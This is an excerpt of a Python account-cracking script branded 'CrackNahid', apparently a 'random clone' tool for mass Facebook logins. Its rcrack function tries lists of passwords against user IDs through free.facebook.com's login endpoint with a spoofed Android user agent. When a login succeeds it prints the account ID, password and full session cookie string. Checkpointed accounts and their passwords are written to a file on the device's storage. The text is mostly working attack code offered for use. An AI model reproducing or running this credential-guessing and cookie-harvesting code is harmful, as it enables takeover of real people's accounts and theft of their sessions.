...
logo = ("""
\033[1;92m
\033[1;96m   _____                _    _   _       _     _     _ 
\033[1;92m / ____|              | |  | \ | |     | |   (_)   | |
\033[1;94m | |     _ __ __ _  ___| | _|  \| | __ _| |__  _  __| |
\033[1;95m | |    | '__/ _` |/ __| |/ / . ` |/ _` | '_ \| |/ _` |
\033[1;92m | |____| | | (_| | (__|   <| |\  | (_| | | | | | (_| |
\033[1;98m  \_____|_|  \__,_|\___|_|\_\_| \_|\__,_|_| |_|_|\__,_| \033[1;92m
                                                       
                                                       

┃ Tools    : RENDOM CLONE               ┃
┃ Owner    : CrackNahid                 ┃
┃ Telegram : https://t.me/CrackNahid02  ┃
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "user-agent': 'Mozilla/5.0 (Linux; Android 7.1.1; Nokia 6 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \33[1;30m(CrackNahid-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(CrackNahid-OK)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/CrackNahid-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[CrackNahid] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
